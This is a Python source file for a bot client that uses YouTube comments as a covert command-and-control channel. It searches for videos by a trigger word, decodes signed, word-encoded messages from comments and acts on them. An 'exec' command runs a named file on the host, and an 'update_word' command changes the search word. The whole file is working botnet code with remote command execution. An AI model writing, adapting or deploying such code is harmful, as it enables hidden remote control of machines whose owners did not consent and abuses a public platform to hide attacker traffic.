import base64
import json
from youtubesearchpython import *
from youtube_comment_downloader import *
import ecdsa
import time
import subprocess

contact_word = 'batman'
commands_word = None
contact_video = None
youtube_downloader = YoutubeCommentDownloader()
try:
    f = open("public_key.pem", "r")
    public_key = ecdsa.VerifyingKey.from_pem(f.read())
except:
    print("couldn't read the public key! Exiting...")
    exit()
try:
    f = open("words_to_b64.json", "r")
    translator = json.load(f)
except:
    print("Couldn't read words_to_b64.json! Exiting...")
    exit()

print(public_key)

last_timestamp = 0
idle_time = 15
attempt_number = 0
max_attempt_number = 10


def find_videos():
    global contact_video
    word = contact_word if commands_word is None else commands_word
    counters = dict()
    for _ in range(10):
        # fetch videos
        videos = VideosSearch(word, limit=50).result()

        # filter videos that have sufficient amount of time
        videos = list(filter(lambda x: (not x['publishedTime'] is None) and (
                    'month' in x['publishedTime'] or 'week' in x['publishedTime']), videos['result']))
        videos = list(
            filter(lambda x: (not x['viewCount']['text'] is None) and (
                        200000 <= int(x['viewCount']['text'].split(' ')[0].replace(',', '')) <= 2000000), videos))

        videos_ids = [video['id'] for video in videos]

        for video_id in videos_ids:
            if video_id not in counters:
                counters[video_id] = 1
            else:
                counters[video_id] += 1

    return counters


def verify_comment(comment):
    global translator
    global public_key
    global last_timestamp
    comment_words = comment['text'].split()
    if all([(True if c in translator else False) for c in comment_words]):
        # constructing string out of comment:
        word_escaped_comment = ''
        for word in comment_words:
            word_escaped_comment += translator[word]
        if word_escaped_comment.count('$') != 2:
            return None
        message, time_stamp, signature = word_escaped_comment.split('$')
        if int(base64.b64decode(time_stamp.encode()).decode()) <= last_timestamp:
            return None
        last_timestamp = int(base64.b64decode(time_stamp.encode()).decode())
        try:
            result = base64.b64decode(message.encode()).decode() if public_key.verify(base64.b64decode(signature.encode()), (message + '$' + time_stamp).encode()) else None
            return result
        except:
            return None
    return None


def search_video_for_contact_comment(video_id):
    print(f'Downloading comments for https://www.youtube.com/watch?v={video_id}')
    comments = youtube_downloader.get_comments_from_url(f'https://www.youtube.com/watch?v={video_id}', sort_by=SORT_BY_RECENT)
    print(f'Checking comments for https://www.youtube.com/watch?v={video_id}')
    for comment in comments:
        result = verify_comment(comment)
        if result:
            print()
            print("Verification Success!")
            print("The message is:", result)
            print()
            return result
    return None


def get_bot_commands():
    # finding potential videos
    videos = find_videos()
    print('Found the following videos:', videos)
    print()

    # searching the videos for comments for contact video
    while videos:
        max_video_id = max(videos, key=lambda x: videos[x])
        comment = search_video_for_contact_comment(max_video_id)
        if comment is not None:
            return comment
        del videos[max_video_id]
    return None


def main():
    global commands_word
    global attempt_number
    global max_attempt_number
    while True:
        if commands_word is None:
            print(f"Searching videos with first-contact word: {contact_word}")
        else:
            attempt_number += 1
            if attempt_number > max_attempt_number:
                attempt_number = 0
                commands_word = None
                print(f"Searching videos with first-contact word: {contact_word}")
            else:
                print(f"Searching videos with updated word: {commands_word} (attempts: {attempt_number}/{max_attempt_number})")
        message = get_bot_commands()
        if message is None:
            print(f"Entering idle time for {idle_time} seconds")
            print()
            time.sleep(idle_time)
            continue
        attempt_number = 0
        result = message.split(' ')
        command = result[0]
        if command == 'exec':
            try:
                subprocess.check_call([result[1]])
            except:
                print(f"Couldn't execute this file {result[1]}")
        elif command == 'update_word':
            print(f"Set new search word: {result[1]}")
            commands_word = result[1]


if __name__ == '__main__':
    main()
